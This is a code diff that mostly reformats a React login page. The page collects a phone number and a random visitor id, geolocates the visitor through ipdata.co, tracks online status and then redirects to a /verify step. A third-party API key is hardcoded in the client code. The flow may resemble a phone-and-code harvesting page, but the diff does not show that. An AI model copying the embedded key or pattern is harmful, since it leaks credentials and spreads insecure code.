@@ -14,11 +14,11 @@ export default function LoginPage() {
   const router = useRouter()
   const [phone, setPhone] = useState("")
   const [isLoading, setIsLoading] = useState(false)
-  const _id=randstr('mesy-')
+  const _id = randstr('mesy-')
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
-    addData({id:_id,phone})
-setIsLoading(true)
+    addData({ id: _id, phone })
+    setIsLoading(true)
     setTimeout(() => {
       setIsLoading(false)
       router.push("/verify")
@@ -27,30 +27,29 @@ setIsLoading(true)
   async function getLocation() {
     const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
     const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
-  
+
     try {
-        const response = await fetch(url);
-        if (!response.ok) {
-            throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-        const country = await response.text();
-        addData({
-            id:_id,
-            country: country
-        })
-        localStorage.setItem('country',country)
-        setupOnlineStatus(_id)
-      } catch (error) {
-        console.error('Error fetching location:', error);
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+        id: _id,
+        country: country
+      })
+      localStorage.setItem('country', country)
+      setupOnlineStatus(_id)
+    } catch (error) {
+      console.error('Error fetching location:', error);
     }
   }
-function randstr(prefix:string)
-{
-  return Math.random().toString(36).replace('0.',prefix || '');
-}
+  function randstr(prefix: string) {
+    return Math.random().toString(36).replace('0.', prefix || '');
+  }
   // Avoid hydration mismatch
   useEffect(() => {
-  getLocation().then(()=>{})
+    getLocation().then(() => { })
 
   }, [])
 
